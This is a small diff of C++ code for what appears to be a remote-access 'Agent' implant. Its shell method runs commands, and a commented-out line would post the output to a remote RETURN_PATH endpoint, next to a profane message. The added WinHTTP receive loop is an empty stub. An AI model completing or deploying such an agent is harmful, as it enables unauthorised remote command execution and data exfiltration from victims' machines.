@@ -47,6 +47,13 @@ std::string Agent::Get(std::wstring path) {
 	if (bResults)
 		bResults = WinHttpReceiveResponse(hRequest, NULL);
 	
+	if (bResults) {
+		do {
+			sSize = 0;
+
+		
+		} while (sSize > 0);
+	}
 
 	return result;
 }
@@ -116,6 +123,8 @@ void Agent::shell(std::vector<std::string> args) {
 			result += buf;
 		}
 	}
+
+	//Post(RETURN_PATH + "/Agent/shell/output", data="No Arguments you fucking retard.");
 
 	CloseHandle(hRead);
 	CloseHandle(hWrite);
